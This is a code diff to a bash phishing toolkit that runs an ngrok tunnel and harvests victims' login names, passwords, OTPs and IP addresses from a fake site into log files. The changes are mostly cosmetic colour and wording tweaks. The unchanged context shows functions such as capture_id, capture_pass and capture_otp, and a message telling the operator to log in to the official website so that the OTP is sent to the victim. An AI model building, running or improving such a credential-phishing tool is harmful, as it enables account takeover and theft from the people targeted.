@@ -274,7 +274,7 @@ ngrok_token_check(){
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
 		start_ngrok
         else
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Setting up authtoken"
+                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${BLUE} Setting up authtoken"
                 ngrok_token_setup
         fi
 }
@@ -283,16 +283,18 @@ ngrok_token_setup(){
 		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
         else
 		mkdir $HOME/.ngrok2
-		echo -ne "\n${RED}[${WHITE}-${RED}]${RED} Created Ngrok2 directory "
+		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Created Ngrok2 directory "
 		echo " "
         fi
 
 	rm -rf ${HOME}/.ngrok2/ngrok.yml
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
+	read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your authtoken :" ntoken
 	echo "authtoken : ${ntoken}" >> ngrok.yml
 	mv ngrok.yml ${HOME}/.ngrok2/
 	./.server/ngrok config upgrade
-	echo -ne "\n${RED}[${WHITE}-${RED}]${RED} Upgraded ngrok configurations"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Upgraded ngrok configurations"
+	clear
+	banner
 	start_ngrok
 }
 ngrok_region() {
@@ -732,7 +734,7 @@ capture_data_2() {
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                         capture_id
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
-			echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
+			echo -ne "\n${WHITE} NOTE : OTP will only be sent to victim when you login to offical website"
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
 			echo -ne "\n\n${GREEN} OTP Found !"
@@ -773,7 +775,7 @@ capture_ip() {
 ##      IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IP=$(awk -F 'IP: ' '{print $2}' .server/www/ip.txt | xargs)
         IFS=$'\n'
-        echo -e "\n${RED} Victim's IP : ${RED}$IP"
+        echo -e "\n${MAGENTA} Victim's IP : ${CYAN}$IP"
 	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
 		echo " "
@@ -854,7 +856,7 @@ ip_details() {
 
 ## Get credentials
 capture_id() {
-	echo "${RED}"
+	echo "${CYAN}"
         cat .server/www/usernames.txt
         echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
@@ -864,7 +866,7 @@ capture_id() {
 
 ## Get credentials
 capture_pass() {
-	echo "${RED}"
+	echo "${CYAN}"
 	cat  .server/www/pass.txt
         echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
@@ -874,7 +876,7 @@ capture_pass() {
 
 ## Get otp
 capture_otp() {
-	echo "${RED}"
+	echo "${CYAN}"
         cat  .server/www/otp.txt
         echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
@@ -885,12 +887,12 @@ capture_otp() {
 #online or offline stats
 netstats="Offline"
 check_netstats() {
-			wget -q --spider http://api.github.com
-			if [ $? -eq 0 ]; then
-				netstats="Online"
-			else
-				netstats="Offline"
-			fi
+	wget -q --spider http://api.github.com
+	if [ $? -eq 0 ]; then
+		netstats="Online"
+	else
+		netstats="Offline"
+	fi
 }
 #Logs check
 logs_check() {
